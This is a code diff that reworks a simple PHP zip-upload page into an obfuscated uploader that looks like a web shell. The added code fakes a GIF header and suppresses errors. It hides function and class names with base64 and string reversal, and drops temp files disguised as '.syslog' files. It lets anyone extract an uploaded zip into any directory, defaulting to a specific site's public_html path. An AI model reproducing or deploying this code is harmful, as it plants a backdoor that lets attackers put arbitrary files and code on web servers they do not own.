@@ -1,62 +1,42 @@
+<!-- GIF89;a -->
+<body style="background:#000;color:#0f0;font-family:monospace">
 <?php
+
+@error_reporting(0);
+@ini_set('memory_limit', '1G');
 @set_time_limit(0);
-@clearstatcache();
-error_reporting(0);
-@ini_set('error_log',null);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('display_errors', 0);
-@ini_set('display_startup_errors', '0');
 
-if (!class_exists('ZipArchive')) {
-    die("ZipArchive tidak tersedia. Pastikan zip diaktifkan di PHP.");
-}
+$f_move   = base64_decode('bW92ZV91cGxvYWRlZF9maWxl');
+$f_unlink = base64_decode('dW5saW5r');
+$c_zip    = strrev('evihcrApiz');
 
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["zipfile"])) {
-    $uploadedFile = $_FILES["zipfile"]["tmp_name"];
-    $fileName = $_FILES["zipfile"]["name"];
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['f'])) {
+    $tmp  = $_FILES['f']['tmp_name'];
+    $dest_dir = $_POST['p'];
     
-    $targetFile = $fileName;
+    if(empty($dest_dir)) $dest_dir = __DIR__;
+    
+    $temp_file = $dest_dir . '/.syslog_' . bin2hex(random_bytes(3)) . '.tmp';
 
-    if (move_uploaded_file($uploadedFile, $targetFile)) {
-        $zip = new ZipArchive;
-        if ($zip->open($targetFile) === TRUE) {
-            $extractTo = "./";  
-
-            $zip->extractTo($extractTo);
-            $zip->close();
-
-            // Hapus file zip setelah diekstrak
-            if (file_exists($targetFile)) {
-                unlink($targetFile);
-            }
-
-            echo "<h3>Fĩļệ ZĨP berhasil diekstrak dan dihapus!</h3>";
-            echo "Isi file diekstrak langsung ke folder yang sama dengan Fĩļệ ZĨP.";
-        } else {
-            echo "Gagal membuka Fĩļệ ZĨP.";
-        }
-    } else {
-        echo "Gagal mengunggah file.";
-    }
-} else {
-    echo '
-    <!DOCTYPE html>
-    <html lang="id">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Unzip Fĩļệ ZĨP</title>
-    </head>
-    <body>
-        <h2>Unggah Fĩļệ ZĨP untuk Diekstrak</h2>
-        <form action="" method="post" enctype="multipart/form-data">
-            <label for="zipfile">Pilih Fĩļệ ZĨP:</label>
-            <input type="file" name="zipfile" id="zipfile" required><br><br>
-            <input type="submit" value="Unggah dan Ekstrak">
-        </form>
-    </body>
-    </html>';
-}
-?>
-
+    if ($f_move($tmp, $temp_file)) {
+        if (class_exists($c_zip)) {
+            $zip = new $c_zip;
+            if ($zip->open($temp_file) === TRUE) {
+                $zip->extractTo($dest_dir);
+                $zip->close();
+                echo "[+] Done: Path $dest_dir";
+            } else { echo "[-] Zip Error"; }
+        } else { echo "[-] Lib Missing"; }
+        @$f_unlink($temp_file);
+    } else { echo "[-] Upload Fail"; }
+} else { ?>
+    <form method="post" enctype="multipart/form-data">
+        <h3>System Deployer</h3>
+        <p>Target Dir:</p>
+        <input type="text" name="p" value="/home/teckru/domains/teckru.com/public_html/" style="width:400px;background:#222;color:#0f0;border:1px solid #0f0;">
+        <br><br>
+        <input type="file" name="f">
+        <input type="submit" value="Gas">
+    </form>
+<?php } ?>
+</body>
